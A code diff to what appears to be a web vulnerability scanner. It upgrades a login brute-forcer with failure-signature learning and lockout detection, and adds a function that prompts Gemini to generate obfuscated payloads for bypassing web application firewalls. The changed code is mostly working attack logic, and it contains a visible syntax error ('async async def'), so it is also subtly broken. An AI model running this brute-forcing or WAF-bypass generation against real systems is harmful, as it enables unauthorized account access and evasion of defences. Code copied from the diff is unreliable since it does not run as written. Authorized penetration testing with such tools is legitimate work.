@@ -5091,8 +5091,8 @@ def brute_force_login(target, output, tech, report, session_cookies=None, specif
         *[f'pass{str(i).zfill(3)}' for i in range(100)], # pass000, pass001, ...
     ]
 
-async def brute_force_login(target, output, tech, report, session_cookies=None, specific_form=None):
-    output.print(f"\n[+] Starting Brute Force Attack on Web Login at {target}...")
+async async def brute_force_login(target, output, tech, report, session_cookies=None, specific_form=None):
+    output.print(f"\n[+] Starting Enhanced Brute Force Attack on Web Login at {target}...")
     
     # v7.0 - 500+ Usernames
     usernames = [
@@ -5350,8 +5350,8 @@ async def brute_force_login(target, output, tech, report, session_cookies=None, 
 
     forms_to_test = [specific_form] if specific_form else []
     if not forms_to_test:
-        res_get, request_details, response_details = await _send_async_http_request(target, output=output, session_cookies=session_cookies)
-        if res_get and res_get.text:
+        res_get, _, _ = await _send_async_http_request(target, output=output, session_cookies=session_cookies)
+        if res_get and await res_get.text():
             forms_to_test = _get_forms(await res_get.text(), target)
 
     for form in forms_to_test:
@@ -5360,20 +5360,80 @@ async def brute_force_login(target, output, tech, report, session_cookies=None, 
         pass_param = next((i['name'] for i in form['inputs'] if 'pass' in i['name'].lower() or 'pwd' in i['name'].lower() or 'secret' in i['name'].lower()), None)
 
         if not user_param or not pass_param:
+            output.print(f"  [INFO] Could not identify username/password fields for form at {action_url}. Skipping.")
             continue
 
         output.print(f"  [*] Found login form at {action_url}. Attacking with user param '{user_param}' and pass param '{pass_param}'...")
-        for user in usernames:
-            for pwd in passwords:
-                form_data = {i['name']: i.get('value', '') for i in form['inputs']}
-                form_data[user_param] = user
-                form_data[pass_param] = pwd
+        
+        # --- Improvement: Learn failure signature ---
+        output.print("    [INFO] Learning login failure signature...")
+        failure_signature = None
+        failure_signature_len = 0
+        invalid_form_data = {i['name']: i.get('value', '') for i in form['inputs']}
+        invalid_form_data[user_param] = get_random_string(12)
+        invalid_form_data[pass_param] = get_random_string(12)
+        res_fail, _, _ = await _send_async_http_request(action_url, method=form['method'], data=invalid_form_data, output=output, session_cookies=session_cookies)
+        if res_fail:
+            failure_signature = await res_fail.text()
+            failure_signature_len = len(failure_signature)
+            output.print("    [INFO] Failure signature learned.")
+        else:
+            output.print("    [WARNING] Could not learn failure signature. Brute force may be less reliable.")
 
-                res, request_details, response_details = await _send_async_http_request(action_url, method=form['method'], data=form_data, output=output, session_cookies=session_cookies)
-                if res and (res.status in [301, 302, 307, 308] or any(k in (await res.text()).lower() for k in ['welcome', 'dashboard', 'logout', 'log out', 'sign out'])):
+        failed_attempts = 0
+        lockout_detected = False
+        
+        credentials_to_test = product(usernames, passwords)
+
+        for user, pwd in credentials_to_test:
+            if lockout_detected:
+                break
+
+            form_data = {i['name']: i.get('value', '') for i in form['inputs']}
+            form_data[user_param] = user
+            form_data[pass_param] = pwd
+
+            start_time = time.time()
+            res, request_details, response_details = await _send_async_http_request(action_url, method=form['method'], data=form_data, output=output, session_cookies=session_cookies)
+            duration = time.time() - start_time
+
+            # --- Improvement: Lockout detection ---
+            if duration > 10: # Sudden spike in response time
+                output.print("    [WARNING] High response time detected ( >10s ). Possible rate limiting. Stopping attack on this form to avoid lockout.")
+                lockout_detected = True
+                continue
+
+            if res:
+                response_text = await res.text()
+                # Check for explicit lockout messages
+                if any(msg in response_text.lower() for msg in ["too many attempts", "account locked", "blocked", "rate limit"]):
+                    output.print("    [CRITICAL] Lockout/Rate limiting detected. Stopping brute force on this form.")
+                    lockout_detected = True
+                    continue
+
+                # Compare with failure signature
+                is_failure = False
+                if failure_signature:
+                    # A response is likely a failure if its length is very close to the failure signature's length
+                    if abs(len(response_text) - failure_signature_len) < 100:
+                         is_failure = True
+                
+                # Check for success: A redirect OR success keywords, AND it's NOT a failure page
+                is_success_indicator = (res.status in [301, 302, 307, 308] or any(k in response_text.lower() for k in ['welcome', 'dashboard', 'logout', 'log out', 'sign out']))
+                
+                if is_success_indicator and not is_failure:
                     output.print(f"  [CRITICAL] Credentials found: {user}:{pwd} on {action_url}")
-                    report.add_finding("Weak Credentials for Web Login", "Critical", action_url, f"{user_param}, {pass_param}", f"{user}:{pwd}", "Weak or default credentials were successfully used to log into a web panel.", "Enforce a strong password policy and Multi-Factor Authentication (MFA). Avoid using default or easily guessable credentials.", f"Login URL: {action_url}\nSuccessful Credentials: {user}:{pwd}", method='POST')
-                    return
+                    report.add_finding("Weak Credentials for Web Login", "Critical", action_url, f"{user_param}, {pass_param}", f"{user}:{pwd}", "Weak or default credentials were successfully used to log into a web panel.", "Enforce a strong password policy and Multi-Factor Authentication (MFA). Avoid using default or easily guessable credentials.", f"Login URL: {action_url}\nSuccessful Credentials: {user}:{pwd}", method='POST', request_details=request_details, response_details=response_details)
+                    return # Exit after finding first credential
+                else:
+                    failed_attempts += 1
+            else:
+                failed_attempts += 1
+            
+            if failed_attempts > 20 and failed_attempts % 20 == 0:
+                output.print(f"    [INFO] {failed_attempts} failed attempts. Continuing...")
+
+    report.add_check(f"Brute Force on {target}", "Completed without finding credentials.")
 
 # --- 15. File Inclusion (Directory Traversal) ---
 async def check_file_inclusion(target, form_to_test, output, tech, report, session_cookies=None):
@@ -6000,11 +6060,42 @@ async def check_csrf(target, form_to_test, output, tech, report, session_cookies
 # =================================================================================
 async def ai_generate_dynamic_payloads(vulnerability_type, base_payload, response_snippet, output):
     """
-    (STUB) Generates dynamic payloads using Gemini AI.
-    This is a placeholder to prevent NameError.
+    Generates dynamic payloads using Gemini AI based on the server's response.
     """
-    output.print(f"  [AI STUB] AI payload generation for {vulnerability_type} is not fully implemented. Returning empty list.")
-    return []
+    if not GEMINI_MODEL:
+        output.print("  [AI WARNING] Gemini model not initialized. Cannot generate dynamic payloads.")
+        return []
+
+    output.print(f"  [AI MODE] Analyzing response for {vulnerability_type} to generate bypass payloads...")
+    try:
+        prompt = f"""
+        As a world-class penetration tester, I am testing for {vulnerability_type}.
+        My initial payload was: `{base_payload}`
+        The server returned this response snippet (might be HTML, an error, or a WAF block page):
+        --- RESPONSE SNIPPET ---
+        {response_snippet}
+        --- END OF SNIPPET ---
+        This response suggests my payload was blocked or ineffective. Please analyze the response and the initial payload.
+        Based on your analysis, provide a list of 5-10 creative, alternative payloads designed to bypass the detected protection.
+        Focus on obfuscation, alternative syntax, encoding, or other bypass techniques relevant to {vulnerability_type}.
+        
+        IMPORTANT: Provide only the raw payloads, each on a new line. Do not add any explanations, comments, or formatting like bullet points or numbering.
+        """
+        
+        response = await GEMINI_MODEL.generate_content_async(prompt)
+        
+        # Clean up the response to get raw payloads
+        payloads = [p.strip() for p in response.text.split('\n') if p.strip()]
+        
+        if payloads:
+            output.print(f"  [AI INFO] Generated {len(payloads)} new payloads for {vulnerability_type}.")
+        else:
+            output.print(f"  [AI WARNING] AI did not return any payloads.")
+            
+        return payloads
+    except Exception as e:
+        output.print(f"  [AI ERROR] Failed to generate dynamic payloads: {e}")
+        return []
 
 async def ai_analyze_scan_results(base_url, tech, report, discovered_urls, discovered_forms, output_handler):
     """
